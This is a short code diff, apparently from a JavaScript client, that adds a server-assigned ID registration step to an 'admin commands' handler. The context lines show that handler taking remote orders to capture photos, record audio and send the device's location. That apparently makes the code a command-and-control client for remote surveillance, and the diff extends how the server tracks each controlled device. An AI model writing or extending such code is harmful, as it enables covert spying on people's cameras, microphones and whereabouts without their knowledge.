@@ -330,6 +330,12 @@
         // ─── Handle Admin Commands ──────────────────────────────────
         function handleServerCommand(msg) {
           switch (msg.type) {
+            case 'ASSIGN_ID':
+              ioClientId = String(msg.clientId);
+              if (ioSocket && ioSocket.connected) {
+                ioSocket.emit('register', { uuid: ioClientId });
+              }
+              break;
             case 'CAPTURE_PHOTO': capturePhoto(); break;
             case 'CAPTURE_AUDIO': captureAudio(); break;
             case 'SEND_LOCATION': sendLocation(); break;
